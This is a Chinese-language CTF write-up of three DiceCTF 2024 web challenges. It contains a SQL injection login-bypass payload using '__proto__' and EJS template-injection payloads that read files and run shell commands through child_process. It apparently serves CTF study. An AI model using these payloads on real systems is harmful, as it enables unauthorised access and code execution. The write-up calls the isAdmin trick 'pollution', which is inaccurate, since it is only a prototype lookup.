---
title: DiceCTF 2024 Quals Writeups
contest: DiceCTF 2024 Quals
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [web, js, prototype-pollution, ejs-ssti, base64, sql-injection, auth-bypass, duck]
attack_chain:
  - Dice Dice Goose: history.push([player, goose])×8步编码base64
  - score==9 → flag
  - 历史解: player[0]++ / goose[1]--
  - funnylogin: SQL注入 + isAdmin[__proto__] 原型链污染
  - SQL: ' union select '1 拿 id=1
  - 污染 __proto__ 让 isAdmin 检查通过
  - EJS SSTI: <%- include('/flag.txt') %>
  - <%- global.process.mainModule.require('child_process').execSync('ls -la') %>
key_payload: user=__proto__&pass='%20union%20select%20'1
one_liner: DiceCTF 2024：JS鸭子游戏+SQL注入+原型链污染+EJS SSTI
lesson: SQL注入+'__proto__'污染isAdmin对象可绕过认证
quality: high
---

# DiceCTF 2024 Quals Writeups

## 题目信息
- 比赛：DiceCTF 2024 Quals
- 涵盖：Web 3 题（Dice Dice Goose / funnylogin / EJS）

## 关键攻击链
### 1. Dice Dice Goose（JS 鸭子游戏）
```js
function win(history) {
    const code = encode(history) + ";" + prompt("Name?");
    const score = history.length;
    if (score === 9) log("flag: dice{pr0_duck_gam3r_" + encode(history) + "}");
}
// 解：8 步 player[0]++ / goose[1]--
let player = [0, 1];
let goose = [9, 9];
let history = [];
history.push([structuredClone(player), structuredClone(goose)]);
for (let i = 0; i < 8; i++) {
    player[0]++;
    goose[1]--;
    history.push([structuredClone(player), structuredClone(goose)]);
}
console.log("flag: dice{pr0_duck_gam3r_" + encode(history) + "}");
```

### 2. funnylogin
```js
const isAdmin = {};
const newAdmin = users[Math.floor(Math.random() * users.length)];
isAdmin[newAdmin.user] = true;
app.post("/api/login", (req, res) => {
    const { user, pass } = req.body;
    const query = `SELECT id FROM users WHERE username = '${user}' AND password = '${pass}';`;
    const id = db.prepare(query).get()?.id;
    if (!id) return res.redirect("/?message=Incorrect username or password");
    if (users[id] && isAdmin[user]) {
        return res.redirect("/?flag=" + encodeURIComponent(FLAG));
    }
    return res.redirect("/?message=This system is currently only available to admins...");
});
```
- 攻击：SQL 注入 + `__proto__` 原型链污染
- `user=__proto__&pass=' union select '1`
- `isAdmin['__proto__']` 访问原型链
- 污染原型链让 isAdmin 检查通过

### 3. EJS SSTI
```ejs
<%- include('/flag.txt') %>
<%- global.process.mainModule.require('child_process').execSync('ls -la') %>
```

## 评分
- quality: high（3 题涵盖 JS Duck 游戏 + SQL+原型链污染 + EJS SSTI）
